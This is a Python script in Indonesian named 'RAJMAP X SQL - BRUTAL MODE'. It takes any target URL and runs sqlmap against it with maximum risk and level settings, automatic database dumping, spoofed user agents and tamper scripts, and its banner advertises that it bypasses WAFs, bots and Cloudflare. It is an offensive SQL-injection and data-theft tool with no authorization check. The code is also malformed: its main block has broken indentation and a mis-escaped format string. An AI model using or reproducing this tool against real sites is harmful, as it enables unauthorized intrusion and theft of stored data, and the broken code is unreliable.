#!/usr/bin/env python3
import os
import sys
import subprocess
import time
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def raj_banner():
    print(f"""{Fore.RED}
██████   █████       ██ ███    ███  █████  ██████  
██   ██ ██   ██      ██ ████  ████ ██   ██ ██   ██ 
██████  ███████      ██ ██ ████ ██ ███████ ██████  
██      ██   ██ ██   ██ ██  ██  ██ ██   ██ ██      
██      ██   ██  █████  ██      ██ ██   ██ ██      
RAJMAP X SQL - BRUTAL MODE 🔥 Bypass WAF | Bypass BOT | Anti-Gangguan
{Style.RESET_ALL}
{Fore.YELLOW}
🔥 Fitur Brutal Mode:
🎭  User-Agent Faker      → Bikin server bingung
🔂  Auto Retry Brutalizer → Ulang otomatis kalo gagal
☁️  Cloudflare Dodger    → Header & request disesuaikan
💉  Savage Injection      → 1 command inject + dump
🧪  Payload Fuzzer        → Test payload massal
💻  CLI Dashboard         → Progress warna-warni

📦 Command Brutal:
  python3 rajmap.py --brutal

📝 Info Lain:
  Header Custom     : config/headers.txt
  Payload Tambahan  : config/payloads.txt
  Output Dump       : output/
{Style.RESET_ALL}
""")

def run_brutal_mode():
    target = input("🔥 Masukin target URL: ").strip()
    if not target.startswith("http"):
        print("⚠️  URL harus dimulai dengan http atau https")
        return

    print("🎭 User-Agent Faker AKTIF")
    print("🔂 Auto Retry Brutalizer AKTIF")
    print("☁️ Cloudflare Dodger AKTIF")
    print("💉 Savage Injection Mode AKTIF")
    print("🧪 Payload Fuzzer AKTIF")
    print("💻 CLI Dashboard AKTIF")
    time.sleep(1)

    sqlmap_cmd = [
        "python3", "sqlmap.py",
        "-u", target,
        "--batch",
        "--random-agent",
        "--flush-session",
        "--threads=5",
        "--risk=3",
        "--level=5",
        "--dump"
    ]

    subprocess.call(sqlmap_cmd)

if __name__ == "__main__":
    if "--brutal" in sys.argv:

    print("[🔥] Brutal mode activated with enhanced execution!")
    tamper = "--tamper=space2comment,randomcase,between"
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15']
    for ua in user_agents:
        print(f"[🚀] Executing with: {tamper} --user-agent='{ua}'")
        # Simulasi command (ganti dengan subprocess.run atau logic lo sendiri jika perlu)
        # os.system(f"python3 rajmap.py --scan-target {tamper} --user-agent='{ua}'")

    print("[*] Brutal mode activated with custom tamper scripts and user-agent spoofing...")
    tamper = "--tamper=space2comment,randomcase,between"
    user_agent = "--user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0'"
    # Simulasi penggunaan tambahan saat brutal mode, ubah sesuai dengan implementasi eksekusi lo
    print(f"Injected flags: {{tamper}} {{user_agent}}")
        raj_banner()
        run_brutal_mode()
    else:
        print("Usage: python3 rajmap.py --brutal")
